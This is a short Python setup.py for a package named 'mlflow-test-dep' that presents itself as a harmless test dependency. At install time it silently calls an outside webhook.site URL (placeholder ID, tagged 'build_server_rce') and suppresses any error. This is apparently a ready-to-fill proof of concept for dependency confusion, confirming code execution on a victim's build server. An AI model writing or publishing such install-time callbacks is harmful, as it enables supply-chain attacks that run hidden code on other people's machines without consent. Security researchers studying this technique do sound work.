from setuptools import setup
import urllib.request

try:
    # REPLACE THIS WITH YOUR ACTUAL WEBHOOK.SITE URL
    urllib.request.urlopen("https://webhook.site/YOUR-WEBHOOK-ID?source=build_server_rce")
except Exception:
    pass

setup(
    name="mlflow-test-dep",
    version="0.1",
    description="A test dependency"
)
